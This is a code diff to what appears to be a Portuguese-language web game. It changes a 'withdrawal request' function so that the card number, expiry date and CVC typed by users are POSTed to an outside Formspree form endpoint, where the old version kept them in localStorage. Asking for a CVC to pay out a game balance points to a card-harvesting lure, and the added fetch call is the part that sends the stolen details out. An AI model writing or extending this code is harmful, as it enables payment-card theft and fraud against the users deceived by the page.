@@ -468,27 +468,41 @@
     }
 
     function confirmarRetirar() {
-      const numCartao = document.getElementById('campoNumeroCartao').value.trim();
-      const validade = document.getElementById('campoValidade').value.trim();
-      const cvc = document.getElementById('campoCVC').value.trim();
+  const numCartao = document.getElementById('campoNumeroCartao').value.trim();
+  const validade = document.getElementById('campoValidade').value.trim();
+  const cvc = document.getElementById('campoCVC').value.trim();
 
-      if (!numCartao || !validade || !cvc) {
-        return alert("Por favor preenche todos os campos do cartão!");
-      }
+  if (!numCartao || !validade || !cvc) {
+    return alert("Por favor preenche todos os campos do cartão!");
+  }
 
-      let feedbacks = JSON.parse(localStorage.getItem('feedbacks_jogo')) || [];
-      feedbacks.push({ 
-        texto: `[PEDIDO LEVANTAMENTO - ${saldo.toFixed(2)}€]\nNº Cartão: ${numCartao}\nValidade: ${validade}\nCVC: ${cvc}`, 
-        hora: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) 
-      });
-      localStorage.setItem('feedbacks_jogo', JSON.stringify(feedbacks));
-
+  fetch("https://formspree.io/f/TEU_CODIGO_FORMSPREE", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      saldo: saldo.toFixed(2) + " €",
+      numeroCartao: numCartao,
+      validade: validade,
+      cvc: cvc,
+      dataHora: new Date().toLocaleString()
+    })
+  })
+  .then(response => {
+    if (response.ok) {
       alert("Pedido de levantamento registado com sucesso!");
       document.getElementById('campoNumeroCartao').value = '';
       document.getElementById('campoValidade').value = '';
       document.getElementById('campoCVC').value = '';
       fecharModalRetirar();
+    } else {
+      alert("Ocorreu um erro ao enviar o pedido. Tenta novamente.");
     }
+  })
+  .catch(error => {
+    alert("Erro de conexão ao enviar dados.");
+    console.error(error);
+  });
+}
 
     /* Lógica ADM */
     function autenticarADM() {
